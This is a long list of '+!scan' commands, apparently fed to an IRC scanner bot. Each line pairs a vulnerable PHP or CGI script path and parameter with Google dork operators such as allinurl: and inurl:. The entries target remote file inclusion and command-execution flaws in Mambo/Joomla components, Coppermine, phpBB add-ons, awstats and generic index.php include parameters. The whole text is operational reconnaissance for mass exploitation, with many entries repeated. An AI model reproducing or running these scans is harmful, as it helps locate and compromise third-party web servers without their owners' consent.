+!scan My_eGallery/public/displayCategory.php?basepath=
+!scan modules/My_eGallery/public/displayCategory.php?basepath=
+!scan modules/4nAlbum/public/displayCategory.php?basepath=
+!scan modules/coppermine/themes/default/theme.php?THEME_DIR=
+!scan modules/agendax/addevent.inc.php?agendax_path=
+!scan modules/xoopsgallery/upgrade_album.php?GALLERY_BASEDIR=
+!scan modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=
+!scan modules/coppermine/include/init.inc.php?CPG_M_DIR=
+!scan modules/mod_mainmenu.php?mosConfig_absolute_path= 
+!scan shoutbox/expanded.php?conf=
+!scan pivot/modules/module_db.php?pivot_path=
+!scan library/editor/editor.php?root=
+!scan library/lib.php?root=
+!scan e107/e107_handlers/secure_img_render.php?p=
+!scan main.php?x=
+!scan main.php?page=
+!scan *default.php?page=
+!scan *default.php?body=
+!scan default.php?page=
+!scan *index.php?url=
+!scan *index.php?arquivo=
+!scan index.php?meio.php=
+!scan index.php?include=
+!scan index.php?x=
+!scan index.php?open=
+!scan index.php?visualizar=
+!scan index.php?pagina=
+!scan index.php?inc=
+!scan index.php?page=
+!scan index.php?pag=
+!scan index.php?p=
+!scan index.php?content=
+!scan index.php?cont=
+!scan index.php?c=
+!scan index.php?meio=
+!scan index.php?x=
+!scan index.php?cat=
+!scan index.php?site=
+!scan index.php?configFile=
+!scan index.php?action=
+!scan index.php?do=
+!scan index2.php?x=
+!scan Index.php?id=
+!scan index2.php?content=
+!scan template.php?pagina
+!scan inc/step_one_tables.php?server_inc=
+!scan GradeMap/index.php?page= 
+!scan phpshop/index.php?base_dir= 
+!scan admin.php?cal_dir=
+!scan path_of_cpcommerce/_functions.php?prefix=
+!scan contacts.php?cal_dir=
+!scan convert-date.php?cal_dir=
+!scan album_portal.php?phpbb_root_path=
+!scan mainfile.php?MAIN_PATH=
+!scan dotproject/modules/files/index_table.php?root_dir=
+!scan html/affich.php?base= 
+!scan gallery/init.php?HTTP_POST_VARS=
+!scan pm/lib.inc.php?pm_path=
+!scan ideabox/include.php?gorumDir=
+!scan modules/tasks/viewgantt.php?root_dir= 
+!scan cgi-bin/index.cgi?page=
+!scan cgi-bin/awstats.pl?update=1&logfile=
+!scan cgi-bin/awstats/awstats.pl?configdir
+!scan cgi-bin/ikonboard.cgi
+!scan cgi-bin/acart/acart.pl?&page=
+!scan cgi-bin/quikstore.cgi?category=
+!scan cgi-bin/ubb/ubb.cgi?g=
+!scan cgi-bin/hinsts.pl?                    
+!scan cgi-bin/bp/bp-lib.pl?g=               
+!scan ccbill/whereami.cgi?g=ls
+!scan cgi-bin/telnet.cgi                                   
+!scan cgi-bin/1/cmd.cgi
+!scan calendar.pl?command=login&fromTemplate= 
+!scan encore/forumcgi/display.cgi?preftemp=temp&page=anonymous&file=
+!scan cgi-sys/guestbook.cgi?user=cpanel&template=
+!scan events.cgi?t=
+!scan powerup.cgi?a=latest&t=
+!scan lc.cgi?a=
+!scan news.cgi?a=114&t=
+!scan biznews.cgi?a=33&t=
+!scan jobs.cgi?a=9&t=
+!scan articles.cgi?a=34&t=
+!scan events.cgi?a=155&t=
+!scan latinbitz.cgi?t=
+!scan newsdesk.cgi?t=
+!scan media.cgi?a=11&t=
+!scan reporter.cgi?t=
+!scan news.cgi?t=
+!scan newsupdate.cgi?a=latest&t=
+!scan deportes.cgi?a=latest&t=
+!scan news.cgi?a=latest&t=
+!scan biznews.cgi?a=33&t=
+!scan whereami.cgi?g=id 
+!scan auktion.pl?menue=
+!scan i-mall/i-mall.cgi?p= 
+!scan vote.pl?action=show&id=
+!scan shop.pl/page=
+!scan newsdesk.cgi?a=latest&t=
+!scan fileseek.cgi?head=&foot=
+!scan cgi-bin/probe.cgi?olddat=
+!scan emsgb/easymsgb.pl?print=
+!scan app/webeditor/login.cgi?username=&command=simple&do=edit&password=&file=
+!scan csv_db/csv_db.cgi?fil e=file.extention
+!scan cgi-bin/jammail.pl?job=showoldmail&mail=
+!scan cgi-bin/bbs/read.cgi?file=
+!scan support_page.cgi?file_name=           
+!scan allinurl:index.php?include=
+!scan allinurl:index.php?open=
+!scan allinurl:index.php?visualizar=
+!scan allinurl:index.php?a=
+!scan allinurl:index.php?b=
+!scan allinurl:main.php?x=
+!scan allinurl:main.php?page=
+!scan allinurl:index.php?meio.php=
+!scan allinurl:index.php?page=
+!scan allinurl:index.php?configFile=
+!scan allinurl:index.php?action=
+!scan allinurl:index5.php?configFile=
+!scan allinurl:index5.php?page=
+!scan allinurl:index5.php?content=
+!scan allinurl:index5.php?x=
+!scan allinurl:index5.php?open=
+!scan allinurl:index5.php?m=
+!scan allinurl:index5.php?site=
+!scan allinurl:index5.php?cat=
+!scan allinurl:index.php?d=
+!scan allinurl:index.php?a=
+!scan allinurl:index.php?b=
+!scan allinurl:index.php?c=
+!scan allinurl:index.php?e=
+!scan allinurl:index.php?f=
+!scan allinurl:index.php?g=
+!scan allinurl:index.php?h=
+!scan allinurl:index.php?i=
+!scan allinurl:index.php?j=
+!scan allinurl:index.php?k=
+!scan allinurl:index.php?l=
+!scan allinurl:index.php?m=
+!scan allinurl:index.php?n=
+!scan allinurl:index.php?o=
+!scan allinurl:index.php?p=
+!scan allinurl:index.php?q=
+!scan allinurl:index.php?r=
+!scan allinurl:index.php?s=
+!scan allinurl:index.php?t=
+!scan allinurl:index.php?u=
+!scan allinurl:index.php?v=
+!scan allinurl:index.php?x=
+!scan allinurl:index.php?y=
+!scan allinurl:index.php?z=
+!scan allinurl:index.php?loc=
+!scan allinurl:index.php?seite=
+!scan allinurl:index2.php?d=
+!scan allinurl:index2.php?a=
+!scan allinurl:index.php?ir=
+!scan allinurl:index.php?secao=
+!scan allinurl:index2.php?b=
+!scan allinurl:index2.php?c=
+!scan allinurl:index2.php?e=
+!scan allinurl:index2.php?f=
+!scan allinurl:index2.php?g=
+!scan allinurl:index2.php?h=
+!scan allinurl:index2.php?i=
+!scan allinurl:index2.php?j=
+!scan allinurl:index2.php?k=
+!scan allinurl:index2.php?l=
+!scan allinurl:index2.php?m=
+!scan allinurl:index2.php?n=
+!scan allinurl:index2.php?o=
+!scan allinurl:index2.php?p=
+!scan allinurl:index2.php?q=
+!scan allinurl:index2.php?r=
+!scan allinurl:index2.php?s=
+!scan allinurl:index2.php?t=
+!scan allinurl:index2.php?u=
+!scan allinurl:index2.php?v=
+!scan allinurl:index2.php?v=
+!scan allinurl:index2.php?x=
+!scan allinurl:index2.php?y=
+!scan allinurl:index2.php?z=
+!scan allinurl:index5.php?inc=
+!scan allinurl:index5.php?pg=
+!scan allinurl:index5.php?lv1=
+!scan allinurl:index.php?sub=
+!scan allinurl:index.php?sub2=
+!scan allinurl:index.php?lnk=
+!scan allinurl:index.php?pg=
+!scan allinurl:index.php?lv1=
+!scan allinurl:index.php?lv1=
+!scan allinurl:index.php?sub=
+!scan allinurl:index.php?directfile=
+!scan allinurl:index.php?funcion=
+!scan allinurl:index.php?sub2=
+!scan allinurl:index.php?ll=
+!scan allinurl:index.php?lnk=
+!scan allinurl:index5.php?body=
+!scan allinurl:index5.php?main=
+!scan allinurl:index5.php?visualizar=
+!scan allinurl:index5.php?include=
+!scan allinurl:index5.php?root=
+!scan allinurl:index5.php?pagina=
+!scan allinurl:index5.php?do=
+!scan allinurl:index.php?theme=
+!scan allinurl:index.php?acao=
+!scan allinurl:index5.php?cont=
+!scan allinurl:index5.php?pag=
+!scan allinurl:index5.php?p=
+!scan allinurl:index5.php?lang=
+!scan allinurl:index5.php?language=
+!scan allinurl:index5.php?content=
+!scan allinurl:template.php?pagina=
+!scan llinurl:index.php?sub=
+!scan allinurl:index2.php?sub2=
+!scan allinurl:index2.php?lnk=
+!scan allinurl:index2.php?pg=
+!scan allinurl:index2.php?lv1=
+!scan allinurl:index2.php?sub=
+!scan allinurl:index2.php?directfile=
+!scan allinurl:index2.php?funcion=
+!scan allinurl:index2.php?sub2=
+!scan allinurl:index2.php?ll=
+!scan allinurl:index2.php?lnk=
+!scan allinurl:index5.php?body=
+!scan allinurl:index5.php?main=
+!scan allinurl:index5.php?visualizar=
+!scan allinurl:index5.php?include=
+!scan allinurl:index5.php?root=
+!scan allinurl:index5.php?pagina=
+!scan allinurl:index5.php?do=
+!scan allinurl:index2.php?theme=
+!scan allinurl:index2.php?acao=
+!scan allinurl:index2:php?aa=
+!scan allinurl:index3:php?aa=
+!scan allinurl:index.php?server=
+!scan allinurl:index.php?cal=
+!scan allinurl:index.php?prefix=
+!scan allinurl:index2.php?prefix=
+!scan allinurl:index.php?root_PATH=
+!scan allinurl:index.php?path=
+!scan allinurl:index.php?gorumdir=
+!scan allinurl:index2.php?cont=
+!scan allinurl:index2.php?server=
+!scan allinurl:index2.php?cal=
+!scan allinurl:index2.php?prefix=
+!scan allinurl:index2.php?prefix=
+!scan allinurl:index2.php?root_PATH=
+!scan allinurl:index2.php?path= AKI
+!scan allinurl:exibir.php?abre=
+!scan allinurl:exibir.php?page=
+!scan allinurl:exibir.php?get=
+!scan allinurl:exibir.php?p=
+!scan allinurl:exibir.php?lang=
+!scan allinurl:index2.php?gorumdir=
+!scan allinurl:index2.php?pag=
+!scan allinurl:index2.php?p=
+!scan allinurl:index2.php?lang=
+!scan allinurl:index2.php?language=
+!scan allinurl:index2.php?content=
+!scan allinurl:index.php?middle=
+!scan allinurl:step_one_tables.php?server_inc=
+!scan allinurl:grademade/index.php?page=
+!scan allinurl:phpshop/index.php?base_dir=
+!scan allinurl:admin.php?cal_dir=
+!scan allinurl:_functions.php?prefix=
+!scan allinurl:contacts.php?cal_dir=
+!scan allinurl:admin.php?cal_dir=
+!scan allinurl:convert-date.php?cal_dir=
+!scan allinurl:album_portal.php?phpbb_root_path=
+!scan allinurl:mainfile.php?MAIN_PATH=
+!scan allinurl:index_table.php?root_dir=
+!scan allinurl:affich.php?base=
+!scan allinurl:init.php?HTTP_POST_VARS=
+!scan allinurl:lib.inc.php?pm_path=
+!scan allinurl:include.php?gorumDir=
+!scan allinurl:start_lobby.php?CONFIG[MWCHAT_Libs]=
+!scan allinurl:index.php?configFile=
+!scan allinurl:module_db.php?pivot_path=
+!scan allinurl:step_one.php?server_inc=
+!scan allinurl:index.php?lng=../../include/main.inc&G_PATH=
+!scan allinurl:pipe.php?HCL_path=
+!scan allinurl:write.php?dir=
+!scan allinurl:new-visitor.inc.php?lvc_include_dir=
+!scan allinurl:initdb.php?absolute_path=
+!scan allinurl:theme.php?THEME_DIR=
+!scan allinurl:index.php?configFile=
+!scan allinurl:module_db.php?pivot_path=
+!scan allinurl:step_one.php?server_inc=
+!scan allinurl:index.php?lng=../../include/main.inc&G_PATH=
+!scan allinurl:pipe.php?HCL_path=
+!scan allinurl:write.php?dir=
+!scan allinurl:new-visitor.inc.php?lvc_include_dir=
+!scan allinurl:header.php?systempath=
+!scan allinurl:initdb.php?absolute_path=
+!scan allinurl:theme.php?THEME_DIR=
+!scan allinurl:index.php?pageurl=
+!scan allinurl:expanded.php?conf=
+!scan allinurl:admin.php?cal_dir=
+!scan allinurl:addevent.inc.php?agendax_path=
+!scan allinurl:Packages.php?sourcedir=
+!scan allinurl:_functions.php?prefix
+!scan allinurl:addedit.php?root_dir=
+!scan allinurl:view.php?root_dir=
+!scan allinurl:vw_files.php?root_dir=
+!scan allinurl:addedit.php?root_dir=
+!scan allinurl:viewgantt.php?root_dir=
+!scan allinurl:displayCategory.php?basepath=
+!scan allinurl:default/theme.php?THEME_DIR=
+!scan allinurl:addevent.inc.php?agendax_path=
+!scan allinurl:upgrade_album.php?GALLERY_BASEDIR=
+!scan allinurl:upgrade_album.php?GALLERY_BASEDIR=
+!scan allinurl:init.inc.php?CPG_M_DIR=
+!scan allinurl:mod_mainmenu.php?mosConfig_absolute_path=
+!scan allinurl:expanded.php?conf=
+!scan allinurl:module_db.php?pivot_path=
+!scan allinurl:editor.php?root=
+!scan allinurl:lib.php?root=
+!scan allinurl:secure_img_render.php?p=
+!scan allinurl:default.php?page=
+!scan arquivo.php?data=
+!scan word.php?id=
+!scan mod.php?mod=
+!scan index.php?plugin=
+!scan sendpage.php?page=
+!scan index.php?module=
+!scan index.php?hl=
+!scan modules.php?op=
+!scan index.php?templateid=
+!scan template.php?page=
+!scan article.php?sid=
+!scan allinurl:".php?my="
+!scan allinurl:".php?i="
+!scan allinurl:".php?o="
+!scan allinurl:".php?l="
+!scan allinurl:".php?d="
+!scan allinurl:".php?a="
+!scan allinurl:".php?f="
+!scan allinurl:".php?z="
+!scan allinurl:".php?zo="
+!scan allinurl:".php?la="
+!scan allinurl:".php?perm="
+!scan allinurl:".php?item_id="
+!scan allinurl:".php?f_content="
+!scan allinurl:".php?from="
+!scan allinurl:".php?mid="
+!scan allinurl:".php?lest="
+!scan allinurl:".php?east="
+!scan .gov.br/index.php?arquivo=
+!scan index.php?ver=
+!scan news.php?CONFIG[script_path]=
+!scan /contenido/classes/class.inuse.php
+!scan index.php?p=
+!scan index.php?pagina=
+!scan index.php?page=
+!scan news.php?CONFIG[script_path]=
+!scan index.php?vpagina=
+!scan index.php?arq=
+!scan index.php?pg_ID=
+!scan index.php?pg=
+!scan home.php?page=
+!scan allinurl:"*/newbb/print.php?forum=*topic_id=*"
+!scan allinurl:"*/newbb_plus/*="
+!scan allinurl:"*/news/archive.php?op=*year=*month=*"
+!scan allinurl:".php?a="
+!scan allinurl:".php?abrir="
+!scan allinurl:".php?act="
+!scan allinurl:".php?action="
+!scan allinurl:".php?ad="
+!scan allinurl:".php?archive="
+!scan allinurl:".php?area="
+!scan allinurl:".php?article="
+!scan allinurl:".php?b="
+!scan allinurl:"*/tsep/include/colorswitch.php?tsep_config[absPath]=*"
+!scan allinurl:".php?back="
+!scan allinurl:".php?base="
+!scan allinurl:".php?basedir="
+!scan allinurl:".php?bbs="
+!scan allinurl:".php?board_no="
+!scan allinurl:".php?body="
+!scan allinurl:".php?c="
+!scan allinurl:".php?cal_dir="
+!scan allinurl:".php?cat="
+!scan allinurl:"/include/init.inc.php?CPG_M_DIR="
+!scan allinurl:"/includes/mx_functions_ch.php?phpbb_root_path="
+!scan allinurl:"/modules/AllMyGuests/signin.php?_AMGconfig[cfg_serverpath]="
+!scan allinurl:".php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path="
+!scan allinurl:".php?subd="
+!scan allinurl:".php?subdir="
+!scan allinurl:".php?category="
+!scan allinurl:".php?choice="
+!scan allinurl:".php?class="
+!scan allinurl:".php?club_id="
+!scan allinurl:".php?cod.tipo="
+!scan allinurl:".php?cod="
+!scan allinurl:".php?conf="
+!scan allinurl:".php?configFile="
+!scan allinurl:".php?cont="
+!scan allinurl:".php?corpo="
+!scan allinurl:".php?cvsroot="
+!scan allinurl:".php?d="
+!scan allinurl:".php?da="
+!scan allinurl:".php?date="
+!scan allinurl:".php?debug="
+!scan allinurl:".php?debut="
+!scan allinurl:".php?default="
+!scan allinurl:".php?destino="
+!scan allinurl:".php?dir="
+!scan allinurl:".php?display="
+!scan allinurl:".php?f="
+!scan allinurl:".php?file_id="
+!scan allinurl:".php?file="
+!scan allinurl:".php?filepath="
+!scan allinurl:".php?flash="
+!scan allinurl:".php?folder="
+!scan allinurl:".php?for="
+!scan allinurl:".php?form="
+!scan allinurl:".php?formatword="
+!scan allinurl:".php?funcao="
+!scan allinurl:".php?function="
+!scan allinurl:".php?g="
+!scan allinurl:".php?get="
+!scan allinurl:".php?go="
+!scan allinurl:".php?gorumDir="
+!scan allinurl:".php?goto="
+!scan allinurl:".php?h="
+!scan allinurl:".php?headline="
+!scan allinurl:".php?i="
+!scan allinurl:".php?inc="
+!scan allinurl:".php?include="
+!scan allinurl:".php?includedir="
+!scan allinurl:".php?inter="
+!scan allinurl:".php?itemid="
+!scan allinurl:".php?j="
+!scan allinurl:".php?join="
+!scan allinurl:".php?jojo="
+!scan allinurl:".php?l="
+!scan allinurl:".php?lan="
+!scan allinurl:".php?lang="
+!scan allinurl:".php?link="
+!scan allinurl:".php?load="
+!scan allinurl:".php?loc="
+!scan allinurl:".php?m="
+!scan allinurl:".php?main="
+!scan allinurl:".php?meio.php="
+!scan allinurl:".php?meio="
+!scan allinurl:".php?menu="
+!scan allinurl:".php?menuID="
+!scan allinurl:".php?mep="
+!scan allinurl:".php?month="
+!scan allinurl:".php?mostra="
+!scan allinurl:".php?n="
+!scan allinurl:".php?name="
+!scan allinurl:".php?nav="
+!scan allinurl:".php?new="
+!scan allinurl:".php?news="
+!scan allinurl:".php?next="
+!scan allinurl:".php?nextpage="
+!scan allinurl:".php?o="
+!scan allinurl:".php?op="
+!scan allinurl:".php?open="
+!scan allinurl:".php?option="
+!scan allinurl:".php?origem="
+!scan allinurl:".php?Page_ID="
+!scan allinurl:".php?pageurl="
+!scan allinurl:".php?para="
+!scan allinurl:".php?part="
+!scan allinurl:".php?pg="
+!scan allinurl:".php?pid="
+!scan allinurl:".php?place="
+!scan allinurl:".php?play="
+!scan allinurl:".php?plugin="
+!scan allinurl:".php?pm_path="
+!scan allinurl:".php?pollname="
+!scan allinurl:".php?post="
+!scan allinurl:".php?pr="
+!scan allinurl:".php?prefix="
+!scan allinurl:".php?prefixo="
+!scan allinurl:".php?q="
+!scan allinurl:".php?redirect="
+!scan allinurl:".php?ref="
+!scan allinurl:".php?refid="
+!scan allinurl:".php?regionId="
+!scan allinurl:".php?release_id="
+!scan allinurl:".php?release="
+!scan allinurl:".php?return="
+!scan allinurl:".php?root="
+!scan allinurl:".php?S="
+!scan allinurl:".php?searchcode_id="
+!scan allinurl:".php?sec="
+!scan allinurl:".php?secao="
+!scan allinurl:".php?sect="
+!scan allinurl:".php?sel="
+!scan allinurl:".php?server="
+!scan allinurl:".php?servico="
+!scan allinurl:".php?sg="
+!scan allinurl:".php?shard="
+!scan allinurl:".php?show="
+!scan allinurl:".php?sid="
+!scan allinurl:".php?site="
+!scan allinurl:".php?sourcedir="
+!scan allinurl:".php?start="
+!scan allinurl:".php?storyid="
+!scan allinurl:".php?str="
+!scan allinurl:".php?subject="
+!scan allinurl:".php?sufixo="
+!scan allinurl:".php?systempath="
+!scan allinurl:".php?t="
+!scan allinurl:".php?task="
+!scan allinurl:".php?teste="
+!scan allinurl:".php?theme_dir="
+!scan allinurl:".php?thread_id="
+!scan allinurl:".php?tid="
+!scan allinurl:".php?title="
+!scan allinurl:".php?to="
+!scan allinurl:".php?topic_id="
+!scan allinurl:".php?type="
+!scan allinurl:".php?u="
+!scan allinurl:".php?url="
+!scan allinurl:".php?urlFrom="
+!scan allinurl:".php?v="
+!scan allinurl:".php?var="
+!scan allinurl:".php?vi="
+!scan allinurl:".php?view="
+!scan allinurl:".php?visual="
+!scan allinurl:".php?wPage="
+!scan allinurl:".php?y="
+!scan allinurl:".php?z="
+!scan /components/com_simpleboard/image_upload.php?sbp= allinurl:"com_simpleboard"
+!scan smarty_config.php?root_dir= inurl:"smarty"
+!scan /components/com_forum/download.php?phpbb_root_path= inurl:com_forum
+!scan /components/com_cpg/cpg.php?mosConfig_absolute_path= allinurl:"com_cpg" 
+!scan [Script Path]/admin/index.php?o= allinurl:"admin/index.php"
+!scan /admin/index.php?o= allinurl:"admin/index.php"
+!scan index.php?menu=deti&page= allinurl:"index.php?menu=deti&page"
+!scan include/editfunc.inc.php?NWCONF_SYSTEM[server_path]= intitle:Newswriter
+!scan /classes/adodbt/sql.php?classes_dir= inurl:"index2.php?option=rss"
+!scan send_reminders.php?includedir= inurl:"send_reminders.php?includedir="
+!scan components/com_rsgallery/rsgallery.html.php?mosConfig_absolute_path= com_rsgallery
+!scan inc/functions.inc.php?config[ppa_root_path]= "Index - Albums" inurl:index.php 
+!scan components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path= allinurl:com_extended_registration
+!scan index.php?RP_PATH= inurl:reviewpost
+!scan index.php?pagename= allinurl:phpquiz
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= inurl:/com_remository/
+!scan /modules/coppermine/themes/coppercop/theme.php?THEME_DIR= allinurl:coppermine
+!scan components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path= "inurl:com_phpshop"
+!scan /tools/send_reminders.php?includedir= allinurl:day.php?date=
+!scan SQuery/lib/gore.php?libpath= inurl:"/SQuery/"
+!scan m2f/m2f_phpbb204.php?m2f_root_path= allinurl:/m2f_usercp.php?
+!scan /components/com_extcalendar/admin_events.php?CONFIG_EXT[LANGUAGES_DIR]= inurl:com_extcalendar
+!scan /components/com_extcalendar/admin_events.php?CONFIG_EXT[LANGUAGES_DIR]= allinurl:com_extcalendar
+!scan components/com_extcalendar/admin_events.php?CONFIG_EXT[LANGUAGES_DIR]=
+!scan admin/doeditconfig.php?thispath=../includes&config[path]= inurl:"admin"
+!scan components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path= "inurl:com_phpshop"
+!scan /tools/send_reminders.php?includedir= allinurl:day.php?date=
+!scan SQuery/lib/gore.php?libpath= inurl:"/SQuery/"
+!scan /components/com_simpleboard/image_upload.php?sbp= allinurl:"com_simpleboard"
+!scan m2f/m2f_phpbb204.php?m2f_root_path= allinurl:/m2f_usercp.php?
+!scan wamp_dir/setup/yesno.phtml?no_url= inurl:"setup"
+!scan components/com_simpleboard/image_upload.php?sbp= allinurl:"com_simpleboard"
+!scan /modules/coppermine/themes/coppercop/theme.php?THEME_DIR= allinurl:coppermine
+!scan components/com_forum/download.php?phpbb_root_path= inurl:"com_forum"
+!scan index.php?p= inurl:"/index.php?p=*.php"
+!scan index.php?pag= inurl:"/index.php?pag=*.php"
+!scan template.php?page= inurl:"/template.php?page=*.php"
+!scan main.php?page= inurl:"/main.php?page=*.php"
+!scan index2.php?pag= inurl:"/index2.php?pag=*.php"
+!scan home.php?pag= inurl:"/home.php?pag=*.php"
+!scan index.php?page= inurl:"/index.php?page=*.php"
+!scan default.php?page= inurl:"/default.php?page=*.php"
+!scan inc/cmses/aedatingCMS.php?dir[inc]= inurl:"flashchat"
+!scan /modules/vwar/admin/admin.php?vwar_root= allinurl:vwar
+!scan bb_usage_stats/include/bb_usage_stats.php?phpbb_root_path= inurl:forum
+!scan encapscms_PATH/core/core.php?root= inurl:encapscms_PATH
+!scan inc/session.php?sessionerror=0&lang= inurl:inc
+!scan path/index.php?function=custom&custom= inurl:path
+!scan [MyAlbum_DIR]/language.inc.php?langs_dir= allinurl:[MyAlbum_DIR]
+!scan /inc/irayofuncs.php?irayodirhack= inurl:"/inc/"
+!scan index.php?function=custom&custom= inurl:custom
+!scan cyberfolio/portfolio/msg/view.php?av= inurl:cyberfolio
+!scan /modules/kernel/system/startup.php?CFG_PHPGIGGLE_ROOT= inurl:CFG_PHPGIGGLE_ROOT
+!scan *mwchat/libs/start_lobby.php?CONFIG[MWCHAT_Libs]= 
+!scan *zentrack/index.php?configFile= 
+!scan *pivot/modules/module_db.php?pivot_path= 
+!scan *inc/header.php/step_one.php?server_inc= 
+!scan *install/index.php?lng=../../include/main.inc&G_PATH= 
+!scan *inc/pipe.php?HCL_path= 
+!scan *include/write.php?dir= 
+!scan *include/new-visitor.inc.php?lvc_include_dir= 
+!scan *includes/header.php?systempath= 
+!scan *support/mailling/maillist/inc/initdb.php?absolute_path= 
+!scan *coppercop/theme.php?THEME_DIR= 
+!scan *zentrack/index.php?configFile= 
+!scan *pivot/modules/module_db.php?pivot_path= 
+!scan *inc/header.php/step_one.php?server_inc= 
+!scan *install/index.php?lng=../../include/main.inc&G_PATH= 
+!scan *inc/pipe.php?HCL_path= 
+!scan *include/write.php?dir= 
+!scan include/new-visitor.inc.php?lvc_include_dir= 
+!scan includes/header.php?systempath= 
+!scan support/mailling/maillist/inc/initdb.php?absolute_path= 
+!scan coppercop/theme.php?THEME_DIR= 
+!scan becommunity/community/index.php?pageurl= 
+!scan shoutbox/expanded.php?conf= 
+!scan agendax/addevent.inc.php?agendax_path= 
+!scan myPHPCalendar/admin.php?cal_dir= 
+!scan yabbse/Sources/Packages.php?sourcedir= 
+!scan zboard/zboard.php 
+!scan path_of_cpcommerce/_functions.php?prefix 
+!scan dotproject/modules/projects/addedit.php?root_dir= 
+!scan dotproject/modules/projects/view.php?root_dir= 
+!scan dotproject/modules/projects/vw_files.php?root_dir= 
+!scan dotproject/modules/tasks/addedit.php?root_dir= 
+!scan dotproject/modules/tasks/viewgantt.php?root_dir= 
+!scan My_eGallery/public/displayCategory.php?basepath= 
+!scan modules/My_eGallery/public/displayCategory.php?basepath= 
+!scan modules/4nAlbum/public/displayCategory.php?basepath= 
+!scan modules/coppermine/themes/default/theme.php?THEME_DIR= 
+!scan modules/agendax/addevent.inc.php?agendax_path= 
+!scan modules/xoopsgallery/upgrade_album.php?GALLERY_BASEDIR= 
+!scan modules/xgallery/upgrade_album.php?GALLERY_BASEDIR= 
+!scan modules/coppermine/include/init.inc.php?CPG_M_DIR= 
+!scan modules/mod_mainmenu.php?mosConfig_absolute_path= 
+!scan shoutbox/expanded.php?conf= 
+!scan pivot/modules/module_db.php?pivot_path= 
+!scan library/editor/editor.php?root= 
+!scan library/lib.php?root= 
+!scan e107/e107_handlers/secure_img_render.php?p= 
+!scan main.php?x= 
+!scan main.php?page= 
+!scan *default.php?page= 
+!scan *default.php?body= 
+!scan default.php?page= 
+!scan *index.php?url= 
+!scan *index.php?arquivo= 
+!scan index.php?meio.php= 
+!scan index.php?include= 
+!scan index.php?x= 
+!scan index.php?open= 
+!scan index.php?visualizar= 
+!scan index.php?pagina= 
+!scan index.php?inc= 
+!scan index.php?page= 
+!scan index.php?pag= 
+!scan index.php?p= 
+!scan index.php?content= 
+!scan index.php?cont= 
+!scan index.php?c= 
+!scan index.php?meio= 
+!scan index.php?x= 
+!scan index.php?cat= 
+!scan index.php?site= 
+!scan index.php?configFile= 
+!scan index.php?action= 
+!scan index.php?do= 
+!scan index2.php?x= 
+!scan Index.php?id= 
+!scan index2.php?content= 
+!scan template.php?pagina 
+!scan inc/step_one_tables.php?server_inc= 
+!scan GradeMap/index.php?page= 
+!scan phpshop/index.php?base_dir= 
+!scan admin.php?cal_dir= 
+!scan path_of_cpcommerce/_functions.php?prefix= 
+!scan contacts.php?cal_dir= 
+!scan convert-date.php?cal_dir= 
+!scan album_portal.php?phpbb_root_path= 
+!scan mainfile.php?MAIN_PATH= 
+!scan dotproject/modules/files/index_table.php?root_dir= 
+!scan html/affich.php?base= 
+!scan gallery/init.php?HTTP_POST_VARS= 
+!scan pm/lib.inc.php?pm_path= 
+!scan ideabox/include.php?gorumDir= 
+!scan modules/tasks/viewgantt.php?root_dir= 
+!scan cgi-bin/index.cgi?page= 
+!scan cgi-bin/awstats.pl?update=1&logfile= 
+!scan cgi-bin/awstats/awstats.pl?configdir 
+!scan cgi-bin/ikonboard.cgi 
+!scan cgi-bin/acart/acart.pl?&page= 
+!scan cgi-bin/quikstore.cgi?category= 
+!scan cgi-bin/ubb/ubb.cgi?g= 
+!scan cgi-bin/hinsts.pl? 
+!scan cgi-bin/bp/bp-lib.pl?g= 
+!scan ccbill/whereami.cgi?g=ls 
+!scan cgi-bin/telnet.cgi 
+!scan cgi-bin/1/cmd.cgi 
+!scan calendar.pl?command=login&fromTemplate= 
+!scan encore/forumcgi/display.cgi?preftemp=temp&page=anonymous&file= 
+!scan cgi-sys/guestbook.cgi?user=cpanel&template=
+!scan account.php?action= account.php?action=
+!scan account.php?action= alliurl:"account.php?action="
+!scan account.php?action= alliurl:".php?action="
+!scan account.php?action= .php?action=
+!scan accounts.php?command= allinurl:".php?command="
+!scan addmedia.php?factsfile[$LANGUAGE]= phpGedView
+!scan allinurl:".php?p="
+!scan announcements.php?phpraid_dir= inurl:"phpraid"
+!scan announcements.php?phpraid_dir= inurl:"phpraid signup"
+!scan announcements.php?phpraid_dir= php raid
+!scan announcements.php?phpraid_dir= phpraid
+!scan announcements.php?phpraid_dir= phpraid signup
+!scan arg.php?arg= allinurl:.php?arg=
+!scan args.php?arg= allinurl:.php?arg=
+!scan atom.php5?page= .php5?id=
+!scan auto.php?inc= allinurl:".php?inc="
+!scan auto.php?page= auto.php?page=
+!scan base.php?f1= allinurl:"base.php?f1="
+!scan base.php?f1= allinurl:".php?f1="
+!scan board.php?see= allinurl:"board.php?see="
+!scan board.php?see= allinurl:".php?see="
+!scan book.php5?page= allinurl:php5?page=
+!scan /calendar.php?l= allinurl:"calendar.php?l="
+!scan /calendar.php?l= allinurl:calendar.php?l=
+!scan /calendar.php?p= allinurl:"calendar.php?p="
+!scan /calendar.php?p= allinurl:calendar.php?p=
+!scan /calendar.php?pg= allinurl:"calendar.php?pg="
+!scan /calendar.php?pg= allinurl:calendar.php?pg=
+!scan /calendar.php?s= allinurl:"calendar.php?s="
+!scan /calendar.php?s= allinurl:calendar.php?s=
+!scan /addpost_newpoll.php?addpoll=preview&thispath= allinurl:"/ubbthreads/"
+!scan /addpost_newpoll.php?addpoll=preview&thispath= /ubbthreads/
+!scan /addpost_newpoll.php?addpoll=preview&thispath= "/ubbthreads/"
+!scan /addpost_newpoll.php?addpoll=preview&thispath= "ubbthreads"
+!scan /addpost_newpoll.php?addpoll=preview&thispath= ubbthreads
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= "com_remository"
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= "com_remository
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= com_remository
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= inurl:index.php?option=com_remository
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= "Mambo"
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= Mambo
+!scan /administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path= "com_serverstat"
